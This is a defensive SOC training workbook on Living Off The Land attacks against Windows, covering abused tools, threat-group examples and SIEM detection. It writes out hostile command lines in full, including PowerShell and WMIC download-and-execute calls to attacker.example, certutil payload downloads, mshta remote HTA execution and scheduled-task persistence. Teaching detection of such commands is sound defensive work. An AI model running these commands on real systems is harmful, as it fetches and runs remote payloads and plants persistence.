# 🛡️ SOC Workbook – Living Off The Land (LoL) Attacks on Windows

---

## 📌 Overview

Attackers do not always rely on custom malware or malicious executables. Instead, they frequently abuse trusted system tools already present on the target machine. This technique is known as **Living Off The Land (LoL)**.

Rather than dropping obvious malware, adversaries:
- Reuse built-in Windows utilities
- Blend malicious actions into normal operations
- Execute code in memory
- Persist using legitimate administration mechanisms
- Reduce detection noise

This workbook explains:
- What LoL attacks are
- Why adversaries use them
- Which Windows tools are commonly abused
- How to detect LoL activity using logs and SIEM queries
- How real threat groups used these techniques

---

# 🎯 Learning Objectives

After completing this workbook, you should be able to:
- Understand what Living Off The Land attacks are
- Identify legitimate Windows tools that can be abused
- Recognise attacker techniques that blend into normal system operations
- Detect LoL behaviour using log analysis and SIEM alerts
- Differentiate legitimate admin activity from malicious tradecraft

---

# 1️⃣ What Is Living Off The Land?

Living Off The Land attacks rely on **trusted binaries already installed on the system**.

Instead of uploading malware, attackers abuse:
- PowerShell
- WMIC
- Certutil
- Mshta
- Rundll32
- Scheduled Tasks
- Sysinternals tools (PsExec, Autoruns)

Because these tools are:
- Signed by Microsoft
- Used by administrators
- Allowed by default policies

They can bypass:
- Application allowlists
- Antivirus signatures
- Basic blocking controls

---

# 2️⃣ Why Threat Actors Prefer LoL Techniques

Threat actors use LoL methods because:
- ✔ Built-in tools are trusted
- ✔ No new suspicious binaries are dropped
- ✔ Execution can happen in memory
- ✔ Activity resembles admin behaviour
- ✔ Logs look "normal" unless deeply analysed
- ✔ Persistence blends into system tasks

This makes LoL extremely popular in:
- Espionage campaigns
- Ransomware operations
- Advanced Persistent Threat (APT) activity
- Fileless malware operations

---

# 3️⃣ Real-World Threat Group Examples (2022–2024)

## APT29 (Nobelium)

- Used PowerShell + WMI event subscriptions
- Stored payloads inside WMI properties
- Achieved fileless persistence
- Left minimal disk artefacts

**Technique:** WMI Event Subscription (MITRE T1546.003)

**Advantage:**
- Persistence without visible startup files
- Execution triggered by system events

---

## BlackCat (ALPHV) Ransomware

**Abused:**
- PowerShell
- PsExec
- Certutil

**Purpose:**
- Remote execution
- Lateral movement
- Payload staging

**Advantage:**
- Looked like legitimate administrative activity
- Reduced EDR blocking

---

## QakBot / IcedID (Cobalt Strike Loaders)

**Used:**
- `rundll32.exe`
- `mshta.exe`

**Purpose:**
- Launch Cobalt Strike beacons
- Execute in memory

**Advantage:**
- Execution tied to legitimate signed binaries
- Reduced signature-based detection

---

# 4️⃣ Commonly Abused Windows Tools

---

## 🔵 PowerShell Abuse

PowerShell is a powerful scripting engine built into Windows.

**Why Attackers Use It:**
- Executes code in memory
- Downloads remote payloads
- Bypasses execution policies
- Automates post-exploitation tasks
- Disables security controls

---

### Example 1 – In-Memory Download & Execute

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
```

**What This Does:**
- `-NoP` → No profile
- `-NonI` → Non-interactive
- `-W Hidden` → Hidden window
- `-Exec Bypass` → Bypass execution policy
- `IEX` → Executes downloaded script in memory

This leaves minimal disk evidence.

---

### Example 2 – Encoded Command

```powershell
powershell -EncodedCommand SQBn...
```

Attackers base64 encode payloads to:
- Obfuscate commands
- Evade simple log searches
- Hide malicious keywords

---

### Detection Strategy

**Monitor:**
- Event ID 4688 (Process Creation)
- Sysmon Event ID 1
- PowerShell 4104 (Script Block Logging)

**Example SIEM Query:**
```
index=wineventlog OR index=sysmon 
(EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*-Exec Bypass*")
```

---

## 🔵 WMIC Abuse

WMIC allows command execution and system querying locally or remotely.

### Remote Execution Example

```cmd
wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
```

**What Happens:**
- Executes PowerShell on remote machine
- Launches payload remotely
- No external tool required

This blends into legitimate admin remote operations.

### Detection

Look for:
- `wmic.exe` spawning `powershell.exe`
- Remote process creation
- Suspicious command lines

---

## 🔵 Certutil Abuse

Certutil is meant for certificate management. Attackers abuse it to download files and encode/decode payloads.

### File Download Example

```cmd
certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe
```

This fetches remote content and writes it to disk.

### Decode Payload Example

```cmd
certutil -decode encoded.b64 decoded.exe
```

Converts base64 to executable binary.

### Detection

Monitor:
- `certutil.exe` with `-urlcache`
- `certutil.exe` with `-decode`
- File writes to public directories

---

## 🔵 MSHTA Abuse

Mshta runs HTA files containing VBScript or JavaScript.

### Remote HTA Execution

```cmd
mshta "http://attacker.example/payload.hta"
```

Executes remote script content in host context.

### Inline JavaScript Execution

```cmd
mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell ...');close();"
```

This directly spawns PowerShell.

### Detection

Look for:
- `mshta.exe` with HTTP URLs
- `mshta` executing JavaScript
- `mshta` spawning `powershell.exe`

---

## 🔵 Rundll32 Abuse

Rundll32 runs exported DLL functions.

### DLL Execution Example

```cmd
rundll32.exe C:\Users\Public\backdoor.dll,Start
```

Loads malicious DLL from writable directory.

### URL Handler Abuse

```cmd
rundll32.exe url.dll,FileProtocolHandler "http://attacker.example"
```

Triggers remote content processing.

### Detection

Flag:
- `rundll32` executing from temp/public folders
- `rundll32` spawning network connections
- Suspicious parent-child relationships

---

## 🔵 Scheduled Task Abuse

Attackers create scheduled tasks for persistence.

### Create Persistence at Logon

```cmd
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -Exec Bypass ..."
```

Runs malicious PowerShell on every login.

### Daily Scheduled Execution

```cmd
schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1"
```

Used for ransomware or repeated actions.

### Detection

Monitor:
- Event ID 4698 (Task Creation)
- `schtasks.exe` execution
- Suspicious task names

---

# 5️⃣ Detection Strategy – Behaviour Over Binary

Instead of asking:

❌ *"Is PowerShell bad?"*

Ask:

- ✅ *"Why is PowerShell downloading from the internet?"*
- ✅ *"Why is mshta running remote content?"*
- ✅ *"Why is rundll32 loading DLLs from Temp?"*
- ✅ *"Why is certutil writing executables?"*

---

# 6️⃣ Defensive Measures

To reduce LoL risk:
- Enable PowerShell Script Block Logging (4104)
- Enable Sysmon for command-line logging
- Use AppLocker or WDAC
- Enforce least privilege
- Monitor scheduled task creation
- Monitor WMI event subscription creation
- Restrict outbound traffic
- Review parent-child process relationships

---

# 7️⃣ SOC Analyst Mindset

LoL attacks succeed when defenders focus only on:
- Malware signatures
- Unknown binaries

LoL detection requires:
- Full command-line logging
- Behavioural analysis
- Process tree reconstruction
- Context-based alerting

---

# 🧠 Final Takeaway

Living Off The Land techniques:
- Use trusted binaries
- Blend into admin workflows
- Enable fileless execution
- Support persistence and lateral movement
- Power many modern ransomware and APT campaigns

As a SOC analyst, your job is not to block PowerShell.

**Your job is to detect when PowerShell behaves like an attacker.**
